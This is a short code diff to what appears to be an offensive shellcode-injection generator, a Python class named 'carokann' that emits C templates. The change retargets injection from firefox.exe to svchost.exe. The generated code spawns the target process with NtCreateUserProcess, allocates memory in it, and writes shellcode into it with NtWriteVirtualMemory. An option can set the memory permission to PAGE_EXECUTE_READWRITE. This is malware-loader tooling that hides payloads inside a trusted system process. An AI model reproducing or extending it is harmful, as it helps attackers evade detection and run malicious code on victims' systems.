@@ -5,7 +5,7 @@ from c.utils.functions import *
 class carokann:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
-        self.target = 'firefox.exe'
+        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
         if 'perm' in arguments:
             if arguments['perm'] == 'rwx':
                 self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
@@ -43,7 +43,7 @@ class carokann:
         """
         template = '{transformers}'
         template += 'SIZE_T shellcodeSize = {shellcodeSize};'
-        template += NtCreateUserProcess('C:\\\\windows\\\\system32\\\\cmd.exe')
+        template += NtCreateUserProcess(self.target)
         template += NtAllocateVirtualMemory('buffer', 'hProcess', 'shellcodeSize + sizeof(SIZE_T)', 'MEM_COMMIT', 'PAGE_READWRITE')
         template += NtWriteVirtualMemory('hProcess', 'buffer', '&shellcodeSize', 'sizeof(SIZE_T)')
         template += NtWriteVirtualMemory('hProcess', 'buffer + sizeof(SIZE_T)', 'shellcode', 'shellcodeSize')
